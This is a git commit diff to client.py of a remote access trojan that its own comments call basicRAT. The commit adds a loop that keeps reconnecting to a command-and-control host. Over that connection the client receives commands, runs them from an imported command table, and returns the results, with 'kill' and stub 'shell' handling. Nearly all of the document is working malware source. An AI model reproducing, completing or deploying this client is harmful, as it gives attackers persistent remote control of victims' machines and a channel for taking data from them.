fe9418e8763c194ae20b4def59879d5a88ce4b3d
deadpix3l <skylerr.curtis@gmail.com>
2017-06-27 15:10:28 +0000

    added reconnect and error checking

--- client.py
+++ client.py
@@ -1,58 +1,86 @@
 #!/usr/bin/env python
 # coding: utf-8
 import socket
+import time
 
 from extras import common
-from commands import silent, active
+from commands import active
 
 # change these to suit your needs
 c2host = 'localhost'
 c2port = 1337
 duport = 1338 # for download/upload
+
 #################################
 ##        Main Function        ##
 #################################
 def main():
     
-    # connect to basicRAT server
-    conn = socket.socket()
-    conn.connect((c2host, c2port))
-
+    #Connection Loop
+    connected = False
     while True:
-        results = ''
-
-        # wait to receive data from server
-        # SHORTFALL: maximum command size is 4096
-        # REMEDY: Increase if needed. 4096 should be enough.
-        data = conn.recv(4096)
-        
-        if not data: continue
-
-        # seperate data into command and action
-        # all commands are lowercase.
-        data = data.rstrip()
-        cmd, _, action = data.partition(' ')
-        cmd = cmd.lower()
-        
         try:
-            if cmd in silent:
-                print "silent - {}".format(cmd)
-                com = silent[cmd]
-                com(action)
+            print "trying to connect...",
+            conn = socket.socket()
+            conn.connect((c2host, c2port))
+            conn.settimeout(None)
+            connected = True
+            print "Connected!"
+        except socket.error:
+            print "Failed. retrying in 2 sec."
+            time.sleep(2)
+            continue
+
+        while connected:
+            results = ''
+
+            # wait to receive data from server
+            # SHORTFALL: maximum command size is 4096
+            # REMEDY: Increase if needed. 4096 should be enough.
+            try:
+                data = conn.recv(4096)
             
-            elif cmd in active:
-                print "action - {}".format(cmd)
+                #socket was closed
+                if not data:
+                    raise socket.error
+
+            except socket.error:
+                print "connection lost"
+                conn.close()
+                connected  = False
+                break
+
+            # seperate data into command and action
+            # all commands are lowercase.
+            data = data.rstrip()
+            cmd, _, action = data.partition(' ')
+            cmd = cmd.lower()
+
+            #try:
+            if cmd in active:
+                print "action - {} {}".format(cmd, action)
                 com = active[cmd]
                 results = com(action)
-                # send results here
-                conn.send(results)
+                if results:
+                    conn.send(results)
+
+            # Special cases
+            elif cmd == "kill":
+                print "KILLED"
+                conn.close()
+                exit(127)
+
+            elif cmd=="shell":
+                pass
                 
             else:
-                print "an invalid command was received - [ {}(\"{}\") ]\n".format(cmd, action)
+                print "invalid - [ {}(\"{}\") ]".format(cmd, action)
         
-        except Exception as e:
-            print e
-            raise
+            #except Exception as e:
+            #  consider adding a blanket except
+            # to close sockets gracefully before traceback
+            #   conn.close()
+            #   raise
 
 if __name__ == '__main__':
     main()
